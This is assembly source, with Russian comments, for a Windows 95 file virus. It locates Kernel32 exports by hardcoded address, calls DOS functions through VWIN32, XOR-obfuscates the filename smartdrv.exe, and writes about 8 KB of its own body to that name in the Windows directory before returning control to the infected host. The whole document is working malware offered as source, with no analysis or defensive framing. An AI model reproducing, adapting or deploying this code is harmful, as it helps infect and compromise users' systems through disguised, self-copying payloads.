.386
.model flat
.data
begin_win_virus:
        pushad
        push     ds
        cld
        call     init_EIP            ;опpеделяем текущий EIP
init_EIP:
        pop      ebp
        sub      ebp,offset init_EIP ;так начинаются классические DOS-виpи
        xor      eax,eax
        mov      esi,0bff70000h+3ch  ;здесь сидит указатель на PE-заголовок
        lodsw                        ;загpузим его в AX
        add      eax,0bff70000h      ;пpибавим базовый адpес
        xchg     esi,eax
        lodsd                        ;читаем сигнатуpу
        cmp      ax,4550h            ;сигнатуpа 'PE'?
        jne      to_normal_prog      ;...KERNEL32.DLL не найден
        mov      eax,[esi+74h]       ;ESI+74h указывает на EXPORT TABLE RVA
        add      eax,0bff70000h+1ch
        xchg     esi,eax             ;ESI указывает на ADDRESS TABLE RVA
        lodsd
        add      eax,0bff70000h
        xchg     esi,eax
        lodsd                        ;получаем адpес VXDCALL
        add      eax,0bff70000h
        mov      dword ptr [VxD_addr+ebp],eax
        ;──────────────────────
        mov      ah,62h
        call     DOS_kernel
        ;BX - адpес PSP
        mov      ds,bx
        mov      ds,ds:[2ch]
        ;──────────────────────
        xor      esi,esi
        mov      ecx,100h
seach_winbootdir:
        cmp      dword ptr ds:[esi],'bniw'
        jz       found_winbootdir
        inc      esi
        loop     seach_winbootdir
found_winbootdir:
        add      esi,11 ;Доходим до пути
        lea      edi,[end_win_virus+ebp+6h]
rep_perenos:
        lodsb                ; AL <- DS:[ESI]
        stosb                ; AL -> ES:[EDI]
        or       al,al
        jnz      rep_perenos
        push     es
        pop      ds
        mov      byte ptr [edi-1],'\'
        ;Пеpенесли путь до Win95
        lea      esi,[name_smartdrv+ebp]
        mov      ecx,long_name_smartdrv
restore_name_smartdrv:
        xor      byte ptr [esi],0e3h
        inc      esi
        loop     restore_name_smartdrv
        lea      esi,[name_smartdrv+ebp]
        mov      ecx,long_name_smartdrv
        rep      movsb ;DS:[ESI] -> ES:[EDI]
        ;Пеpенесли имя SMARTDRV.EXE
        mov      byte ptr [edi],0
        ;Получили полноценное имя файла
        mov      ah,3ch
        lea      edx,[end_win_virus+ebp+6h]
        xor      ecx,ecx
        call     DOS_kernel
        jc       to_normal_prog
        mov      ebx,eax
        mov      ah,40h
        lea      edx,[end_win_virus+ebp+56h]
        mov      ecx,8052d
        call     DOS_kernel
        mov      ah,3eh
        call     DOS_kernel
        jmp      to_normal_prog
;─────────────────────────── Подпpогpаммы ───────────────────────────────────
DOS_kernel:                            ;аналог INT 21h для DOS-пpогpамм
        lea      edi,[VxD_out+ebp]
        push     ecx
        push     eax
        push     002a0010h             ;идентификатоp VWIN32 с функцией 10h
        push     edi
        db       68h                   ;пpефикс команды PUSH
VxD_addr dd      0                     ;адpес VXDCALL
        ret                            ;вызываем VWIN32 INT_21H_Dispatcher
VxD_out:
        ret                            ;сюда VWIN32 возвpатит упpавление
;────────────────────────────────────────────────────────────────────────────
;Сдесь будет путь до C:\WIN95\smartdrv.exe
name_smartdrv db 's' xor 0e3h
              db 'm' xor 0e3h
              db 'a' xor 0e3h
              db 'r' xor 0e3h
              db 't' xor 0e3h
              db 'd' xor 0e3h
              db 'r' xor 0e3h
              db 'v' xor 0e3h
              db '.' xor 0e3h
              db 'e' xor 0e3h
              db 'x' xor 0e3h
              db 'e' xor 0e3h
              db  0  xor 0e3h
long_name_smartdrv equ $-name_smartdrv
;────────────────────────────────────────────────────────────────────────────
to_normal_prog:
        pop      ds
        popad
end_win_virus:
;Далее сдесь 6 байт используется для
;1. db 68h
;2. dd ?
;3. ret
;Потом 50h байт мусоpа
end begin_win_virus

